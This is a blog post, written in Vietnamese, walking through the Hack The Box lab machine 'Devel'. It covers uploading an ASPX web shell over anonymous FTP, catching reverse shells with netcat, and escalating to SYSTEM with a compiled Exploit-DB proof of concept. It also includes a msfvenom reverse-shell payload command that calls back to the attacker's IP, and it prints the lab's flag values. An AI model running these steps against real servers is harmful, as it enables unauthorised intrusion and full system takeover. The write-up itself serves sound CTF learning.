@@ -1,0 +1,866 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Devel HTB - Zoltán&#39;s Blog</title>
+  <meta name="description" content="Devel ở đây có 2 cổng đang mở là 21 là ftp và 80 là http webserver đang chạy web với phần mở rộng tệp là .aspx
+tìm được bài khai thác với metasploit:
+https://www.rapid7.com/blog/post/2009/12/28/exploiting-microsoft-iis-with-metasploit/
+l3mnt2010@ASUSEXPERTBOOK:~$ ftp 10.129.243.118Connected to 10.129.243.118.220 Microsoft FTP ServiceName (10.129.243.118:l3mnt2010): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password:230 User logged in.Remote system type is Windows_NT.ftp&gt; ls229 Entering Extended Passive Mode (|||49158|)125 Data connection already open; Transfer starting.">
+  <meta name="author" content="Zoltán Balogh"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Zoltán\u0027s Blog",
+    
+    "url": "https:\/\/bzoltan1.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/bzoltan1.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/write-up\/2024-12-02-develhtb\/",
+          "name": "Devel htb"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "Devel HTB",
+  "description" : "Devel ở đây có 2 cổng đang mở là 21 là ftp và 80 là http webserver đang chạy web với phần mở rộng tệp là .aspx\ntìm được bài khai thác với metasploit:\nhttps:\/\/www.rapid7.com\/blog\/post\/2009\/12\/28\/exploiting-microsoft-iis-with-metasploit\/\nl3mnt2010@ASUSEXPERTBOOK:~$ ftp 10.129.243.118\rConnected to 10.129.243.118.\r220 Microsoft FTP Service\rName (10.129.243.118:l3mnt2010): anonymous\r331 Anonymous access allowed, send identity (e-mail name) as password.\rPassword:\r230 User logged in.\rRemote system type is Windows_NT.\rftp\u0026gt; ls\r229 Entering Extended Passive Mode (|||49158|)\r125 Data connection already open; Transfer starting.",
+  "inLanguage" : "en",
+  "wordCount":  1865 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/bzoltan1.github.io\/avatar.png",
+  "keywords" : [ "CTF, Vietnamese, Windows" ],
+  "mainEntityOfPage" : "https:\/\/bzoltan1.github.io\/write-up\/2024-12-02-develhtb\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/bzoltan1.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/bzoltan1.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="Devel HTB" />
+<meta property="og:description" content="Devel ở đây có 2 cổng đang mở là 21 là ftp và 80 là http webserver đang chạy web với phần mở rộng tệp là .aspx
+tìm được bài khai thác với metasploit:
+https://www.rapid7.com/blog/post/2009/12/28/exploiting-microsoft-iis-with-metasploit/
+l3mnt2010@ASUSEXPERTBOOK:~$ ftp 10.129.243.118Connected to 10.129.243.118.220 Microsoft FTP ServiceName (10.129.243.118:l3mnt2010): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password:230 User logged in.Remote system type is Windows_NT.ftp&gt; ls229 Entering Extended Passive Mode (|||49158|)125 Data connection already open; Transfer starting.">
+<meta property="og:image" content="https://bzoltan1.github.io/avatar.png" />
+<meta property="og:url" content="https://bzoltan1.github.io/write-up/2024-12-02-develhtb/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Zoltán&#39;s Blog" />
+
+  <meta name="twitter:title" content="Devel HTB" />
+  <meta name="twitter:description" content="Devel ở đây có 2 cổng đang mở là 21 là ftp và 80 là http webserver đang chạy web với phần mở rộng tệp là .aspx
+tìm được bài khai thác với metasploit: …">
+  <meta name="twitter:image" content="https://bzoltan1.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://bzoltan1.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://bzoltan1.github.io/index.xml" type="application/rss+xml" title="Zoltán&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://bzoltan1.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/syntax.css" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="https://bzoltan1.github.io/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://bzoltan1.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Home" href="https://bzoltan1.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://bzoltan1.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Zoltán&#39;s Blog" href="https://bzoltan1.github.io/">
+            <img class="avatar-img" src="https://bzoltan1.github.io/avatar.png" alt="Zoltán&#39;s Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="write-up-heading">
+              
+                <h1>Devel HTB</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <h1 id="devel">Devel</h1>
+<p><img src="https://hackmd.io/_uploads/HJo5FfnX1e.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ByWvb7hXyl.png" alt="image"></p>
+<p>ở đây có 2 cổng đang mở là 21 là ftp và 80 là http webserver đang chạy web với phần mở rộng tệp là <code>.aspx</code></p>
+<p><img src="https://hackmd.io/_uploads/SyQFZm2myl.png" alt="image"></p>
+<p>tìm được bài khai thác với metasploit:</p>
+<p><a href="https://www.rapid7.com/blog/post/2009/12/28/exploiting-microsoft-iis-with-metasploit/">https://www.rapid7.com/blog/post/2009/12/28/exploiting-microsoft-iis-with-metasploit/</a></p>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~$ ftp 10.129.243.118
+Connected to 10.129.243.118.
+220 Microsoft FTP Service
+Name (10.129.243.118:l3mnt2010): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||49158|)
+125 Data connection already open; Transfer starting.
+03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
+03-17-17  04:37PM                  689 iisstart.htm
+03-17-17  04:37PM               184946 welcome.png
+226 Transfer complete.
+ftp&gt; file *
+?Invalid command.
+ftp&gt; get  aspnet_client
+local: aspnet_client remote: aspnet_client
+229 Entering Extended Passive Mode (|||49159|)
+550 Access is denied.
+ftp&gt; get iisstart.htm
+local: iisstart.htm remote: iisstart.htm
+229 Entering Extended Passive Mode (|||49160|)
+125 Data connection already open; Transfer starting.
+100% |***************************************************************************************************************|   689       12.51 KiB/s    00:00 ETA
+226 Transfer complete.
+689 bytes received in 00:00 (11.56 KiB/s)
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||49161|)
+125 Data connection already open; Transfer starting.
+03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
+03-17-17  04:37PM                  689 iisstart.htm
+03-17-17  04:37PM               184946 welcome.png
+226 Transfer complete.
+ftp&gt; cat iisstart.htm
+?Invalid command.
+ftp&gt; quit
+221 Goodbye.
+l3mnt2010@ASUSEXPERTBOOK:~$ cat iisstart.htm
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot; /&gt;
+&lt;title&gt;IIS7&lt;/title&gt;
+&lt;style type=&quot;text/css&quot;&gt;
+&lt;!--
+body {
+        color:#000000;
+        background-color:#B3B3B3;
+        margin:0;
+}
+
+#container {
+        margin-left:auto;
+        margin-right:auto;
+        text-align:center;
+        }
+
+a img {
+        border:none;
+}
+
+--&gt;
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id=&quot;container&quot;&gt;
+&lt;a href=&quot;http://go.microsoft.com/fwlink/?linkid=66138&amp;amp;clcid=0x409&quot;&gt;&lt;img src=&quot;welcome.png&quot; alt=&quot;IIS7&quot; width=&quot;571&quot; height=&quot;411&quot; /&gt;&lt;/a&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+</code></pre><p>connect ftp với anonymous ta thấy các file được dùng ở web cổng 80 -&gt; có vẻ các file này nằm trên root web server</p>
+<p>ý tưởng: up một shell aspx lên ftp sau đó lấy web shell</p>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/tools/SecLists-master/Web-Shells/FuzzDB$ ftp 10.129.243.118
+Connected to 10.129.243.118.
+220 Microsoft FTP Service
+Name (10.129.243.118:l3mnt2010): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||49162|)
+125 Data connection already open; Transfer starting.
+03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
+03-17-17  04:37PM                  689 iisstart.htm
+03-17-17  04:37PM               184946 welcome.png
+226 Transfer complete.
+ftp&gt; put cmd.aspx
+local: cmd.aspx remote: cmd.aspx
+229 Entering Extended Passive Mode (|||49163|)
+125 Data connection already open; Transfer starting.
+100% |***************************************************************************************************************|  1442        1.84 MiB/s    --:-- ETA
+226 Transfer complete.
+1442 bytes sent in 00:00 (12.07 KiB/s)
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||49164|)
+125 Data connection already open; Transfer starting.
+03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
+12-03-24  08:29AM                 1442 cmd.aspx
+03-17-17  04:37PM                  689 iisstart.htm
+03-17-17  04:37PM               184946 welcome.png
+226 Transfer complete.
+ftp&gt;
+</code></pre><p><img src="https://hackmd.io/_uploads/rkE2BQ2Xyx.png" alt="image"></p>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/tools/SecLists-master/Web-Shells/FuzzDB$ sudo /home/l3mnt2010/new/htb/smbserver.py share /smb
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.129.243.118,49175)
+[*] AUTHENTICATE_MESSAGE (\,DEVEL)
+[*] User DEVEL\ authenticated successfully
+[*] :::00::aaaaaaaaaaaaaaaa
+[*] AUTHENTICATE_MESSAGE (\,DEVEL)
+[*] User DEVEL\ authenticated successfully
+[*] :::00::aaaaaaaaaaaaaaaa
+[-] Unknown level for query path info! 0x4
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:SHARE)
+[*] Handle: The NETBIOS connection with the remote host timed out.
+[*] Closing down connection (10.129.243.118,49175)
+[*] Remaining connections []
+[*] Incoming connection (10.129.243.118,49182)
+[*] AUTHENTICATE_MESSAGE (\,DEVEL)
+[*] User DEVEL\ authenticated successfully
+[*] :::00::aaaaaaaaaaaaaaaa
+[*] AUTHENTICATE_MESSAGE (\,DEVEL)
+[*] User DEVEL\ authenticated successfully
+[*] :::00::aaaaaaaaaaaaaaaa
+[-] Unknown level for query path info! 0x4
+[*] Disconnecting Share(1:SHARE)
+[*] Incoming connection (10.129.243.118,49186)
+[*] AUTHENTICATE_MESSAGE (\,DEVEL)
+[*] User DEVEL\ authenticated successfully
+[*] :::00::aaaaaaaaaaaaaaaa
+[*] AUTHENTICATE_MESSAGE (\,DEVEL)
+[*] User DEVEL\ authenticated successfully
+[*] :::00::aaaaaaaaaaaaaaaa
+[-] Unknown level for query path info! 0x4
+[*] Disconnecting Share(1:SHARE)
+[*] Handle: The NETBIOS connection with the remote host timed out.
+[*] Closing down connection (10.129.243.118,49182)
+[*] Remaining connections ['Thread-5 (process_request_thread)']
+[*] Handle: The NETBIOS connection with the remote host timed out.
+[*] Closing down connection (10.129.243.118,49186)
+[*] Remaining connections []
+[*] Incoming connection (10.129.243.118,49189)
+[*] AUTHENTICATE_MESSAGE (\,DEVEL)
+[*] User DEVEL\ authenticated successfully
+[*] :::00::aaaaaaaaaaaaaaaa
+[*] AUTHENTICATE_MESSAGE (\,DEVEL)
+[*] User DEVEL\ authenticated successfully
+[*] :::00::aaaaaaaaaaaaaaaa
+[-] Unknown level for query path info! 0x4
+[*] Disconnecting Share(1:SHARE)
+
+</code></pre><p><img src="https://hackmd.io/_uploads/BJL7y427kl.png" alt="image"></p>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/tools/SecLists-master/Web-Shells/FuzzDB$ nc -lnvp 9997
+listening on [any] 9997 ...
+connect to [10.10.14.45] from (UNKNOWN) [10.129.243.118] 49187
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv&gt;cd ..
+cd ..
+
+c:\Windows\System32&gt;ls
+ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+c:\Windows\System32&gt;cd ..
+cd ..
+
+c:\Windows&gt;cd ..
+cd ..
+
+c:\&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\
+
+10/06/2009  11:42 ��                24 autoexec.bat
+10/06/2009  11:42 ��                10 config.sys
+17/03/2017  06:33 ��    &lt;DIR&gt;          inetpub
+14/07/2009  04:37 ��    &lt;DIR&gt;          PerfLogs
+13/12/2020  12:59 ��    &lt;DIR&gt;          Program Files
+18/03/2017  01:16 ��    &lt;DIR&gt;          Users
+11/02/2022  04:03 ��    &lt;DIR&gt;          Windows
+               2 File(s)             34 bytes
+               5 Dir(s)   4.691.501.056 bytes free
+
+c:\&gt;cd Users
+cd Users
+
+c:\Users&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\Users
+
+18/03/2017  01:16 ��    &lt;DIR&gt;          .
+18/03/2017  01:16 ��    &lt;DIR&gt;          ..
+18/03/2017  01:16 ��    &lt;DIR&gt;          Administrator
+17/03/2017  04:17 ��    &lt;DIR&gt;          babis
+18/03/2017  01:06 ��    &lt;DIR&gt;          Classic .NET AppPool
+14/07/2009  09:20 ��    &lt;DIR&gt;          Public
+               0 File(s)              0 bytes
+               6 Dir(s)   4.691.501.056 bytes free
+
+c:\Users&gt;cd Administrator
+cd Administrator
+Access is denied.
+
+c:\Users&gt;cd babis
+cd babis
+Access is denied.
+
+c:\Users&gt;cd Public
+cd Public
+
+c:\Users\Public&gt;ls
+ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+c:\Users\Public&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\Users\Public
+
+14/07/2009  09:20 ��    &lt;DIR&gt;          .
+14/07/2009  09:20 ��    &lt;DIR&gt;          ..
+14/07/2009  06:53 ��    &lt;DIR&gt;          Documents
+14/07/2009  06:41 ��    &lt;DIR&gt;          Downloads
+14/07/2009  06:41 ��    &lt;DIR&gt;          Music
+14/07/2009  06:41 ��    &lt;DIR&gt;          Pictures
+14/07/2009  09:20 ��    &lt;DIR&gt;          Recorded TV
+14/07/2009  06:41 ��    &lt;DIR&gt;          Videos
+               0 File(s)              0 bytes
+               8 Dir(s)   4.691.501.056 bytes free
+
+c:\Users\Public&gt;cd Documents
+cd Documents
+
+c:\Users\Public\Documents&gt;ls
+ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+c:\Users\Public\Documents&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\Users\Public\Documents
+
+14/07/2009  06:53 ��    &lt;DIR&gt;          .
+14/07/2009  06:53 ��    &lt;DIR&gt;          ..
+               0 File(s)              0 bytes
+               2 Dir(s)   4.691.501.056 bytes free
+
+c:\Users\Public\Documents&gt;cd ..
+cd ..
+
+c:\Users\Public&gt;cd ..
+cd ..
+
+c:\Users&gt;whoami
+^C
+l3mnt2010@ASUSEXPERTBOOK:~/tools/SecLists-master/Web-Shells/FuzzDB$ nc -lnvp 9997
+listening on [any] 9997 ...
+connect to [10.10.14.45] from (UNKNOWN) [10.129.243.118] 49191
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv&gt;whoami
+whoami
+iis apppool\web
+
+c:\windows\system32\inetsrv&gt;
+</code></pre><p>lúc này ta có shell nhưng mà không có quyền đọc user.txt và root.txt</p>
+<p>chạy lệnh <code>systeminfo</code> để xem thông tin hệ thống</p>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/tools/SecLists-master/Web-Shells/FuzzDB$ nc -lnvp 9997
+listening on [any] 9997 ...
+connect to [10.10.14.45] from (UNKNOWN) [10.129.243.118] 49195
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv&gt;systeminfo
+systeminfo
+
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          babis
+Registered Organization:
+Product ID:                55041-051-0948536-86302
+Original Install Date:     17/3/2017, 4:17:31 ��
+System Boot Time:          3/12/2024, 7:40:31 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     3.071 MB
+Available Physical Memory: 2.464 MB
+Virtual Memory: Max Size:  6.141 MB
+Virtual Memory: Available: 5.537 MB
+Virtual Memory: In Use:    604 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection 4
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.129.0.1
+                                 IP address(es)
+                                 [01]: 10.129.243.118
+                                 [02]: fe80::9050:8ddc:98b9:5ce7
+                                 [03]: dead:beef::5c0b:2d8a:8615:2c1b
+                                 [04]: dead:beef::9050:8ddc:98b9:5ce7
+
+c:\windows\system32\inetsrv&gt;
+
+</code></pre><p>có thể thấy hệ thống đnag dùng <code>Microsoft Windows 7 Enterprise</code> khá cũ -&gt; đi tìm lỗ hổng khai thác</p>
+<p><img src="https://hackmd.io/_uploads/B1eTvVnQkl.png" alt="image"></p>
+<p><a href="https://www.exploit-db.com/exploits/47176">https://www.exploit-db.com/exploits/47176</a> -&gt; tải poc -&gt; install <code>apt-get update apt-get install mingw-w64</code> -&gt; compile file poc thành exe -&gt; gett xuống máy windown7 -&gt; thành công lên root.</p>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.45] from (UNKNOWN) [10.129.17.122] 49165
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv&gt;cd &quot;c:\Users\Public\Downloads\&quot;
+cd &quot;c:\Users\Public\Downloads\&quot;
+
+c:\Users\Public\Downloads&gt;dir
+d�ir
+'d�ir' is not recognized as an internal or external command,
+operable program or batch file.
+
+c:\Users\Public\Downloads&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\Users\Public\Downloads
+
+03/12/2024  07:17 ��    &lt;DIR&gt;          .
+03/12/2024  07:17 ��    &lt;DIR&gt;          ..
+03/12/2024  07:17 ��           241.555 40564.exe
+               1 File(s)        241.555 bytes
+               2 Dir(s)   5.027.336.192 bytes free
+
+c:\Users\Public\Downloads&gt;./40564.exe
+./40564.exe
+'.' is not recognized as an internal or external command,
+operable program or batch file.
+
+c:\Users\Public\Downloads&gt;40564.exe
+40564.exe
+
+c:\Windows\System32&gt;whoami
+whoami
+nt authority\system
+
+c:\Windows\System32&gt;cd &quot;C:\Documents and Settings\Administrator\Desktop&quot;
+cd &quot;C:\Documents and Settings\Administrator\Desktop&quot;
+
+C:\Documents and Settings\Administrator\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of C:\Documents and Settings\Administrator\Desktop
+
+14/01/2021  11:42 ��    &lt;DIR&gt;          .
+14/01/2021  11:42 ��    &lt;DIR&gt;          ..
+03/12/2024  06:56 ��                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4.688.244.736 bytes free
+
+C:\Documents and Settings\Administrator\Desktop&gt;type user.txt
+type user.txt
+The system cannot find the file specified.
+
+C:\Documents and Settings\Administrator\Desktop&gt;type root.txt
+type root.txt
+3a6cb930c7277a37575f39f025009672
+
+C:\Documents and Settings\Administrator\Desktop&gt;cd &quot;C:\Documents and Settings\babis\Desktop&quot;
+^C
+l3mnt2010@ASUSEXPERTBOOK:~$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.45] from (UNKNOWN) [10.129.17.122] 49168
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv&gt;cd &quot;C:\Documents and Settings\babis\Desktop&quot;
+cd &quot;C:\Documents and Settings\babis\Desktop&quot;
+Access is denied.
+
+c:\windows\system32\inetsrv&gt;cd &quot;c:\Users\Public\Downloads\&quot;
+cd &quot;c:\Users\Public\Downloads\&quot;
+
+c:\Users\Public\Downloads&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\Users\Public\Downloads
+
+03/12/2024  07:17 ��    &lt;DIR&gt;          .
+03/12/2024  07:17 ��    &lt;DIR&gt;          ..
+03/12/2024  07:17 ��           241.555 40564.exe
+               1 File(s)        241.555 bytes
+               2 Dir(s)   4.688.646.144 bytes free
+
+c:\Users\Public\Downloads&gt;40564.exe
+40564.exe
+
+c:\Windows\System32&gt;cd &quot;C:\Documents and Settings\babis\Desktop&quot;
+cd &quot;C:\Documents and Settings\babis\Desktop&quot;
+
+C:\Documents and Settings\babis\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of C:\Documents and Settings\babis\Desktop
+
+11/02/2022  03:54 ��    &lt;DIR&gt;          .
+11/02/2022  03:54 ��    &lt;DIR&gt;          ..
+03/12/2024  06:56 ��                34 user.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4.688.646.144 bytes free
+
+C:\Documents and Settings\babis\Desktop&gt;type user.txt
+type user.txt
+e08b790187c71abcdb5fd992fa586f8c
+</code></pre><p><img src="https://hackmd.io/_uploads/S1OUya37kl.png" alt="image"></p>
+<pre><code>l3mnt2010@ASUSEXPERTBOOK:~/tools/SecLists-master/Web-Shells/FuzzDB$ msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.45 LPORT=4444 -o reverse-shell.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of aspx file: 2736 bytes
+Saved as: reverse-shell.aspx
+l3mnt2010@ASUSEXPERTBOOK:~/tools/SecLists-master/Web-Shells/FuzzDB$ ftp 10.129.17.122
+^C
+
+l3mnt2010@ASUSEXPERTBOOK:~/tools/SecLists-master/Web-Shells/FuzzDB$ ftp 10.129.17.122
+Connected to 10.129.17.122.
+220 Microsoft FTP Service
+Name (10.129.17.122:l3mnt2010): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; put reverse-shell.aspx
+local: reverse-shell.aspx remote: reverse-shell.aspx
+229 Entering Extended Passive Mode (|||49162|)
+125 Data connection already open; Transfer starting.
+100% |***************************************************************************|  2774       22.80 MiB/s    --:-- ETA
+226 Transfer complete.
+2774 bytes sent in 00:01 (1.55 KiB/s)
+ftp&gt;
+
